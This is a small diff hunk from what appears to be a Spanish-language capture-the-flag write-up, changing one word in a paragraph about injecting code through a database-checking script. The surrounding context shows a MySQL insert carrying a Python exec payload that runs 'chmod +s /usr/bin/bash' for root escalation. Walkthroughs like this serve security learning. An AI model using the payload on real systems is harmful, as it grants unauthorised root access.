@@ -191,7 +191,7 @@ def assessData(i):
                 pass
 ```
 
-Lo que hace es verificar patrones maliciosos en la base de datos. Si cargamos esto, podemos inyectar código para que se ejecute. Nos conectamos a la base de datos y ejecutamos lo siguiente:
+Lo que hace es verificar patrones maliciosos en la base de datos. Si saturamos esto, podemos inyectar código para que se ejecute. Nos conectamos a la base de datos y ejecutamos lo siguiente:
 
 ```
 mysql> insert into escalate values ("1","1","1",'test=exec("""\nimport os\nos.system("chmod +s /usr/bin/bash")""")');
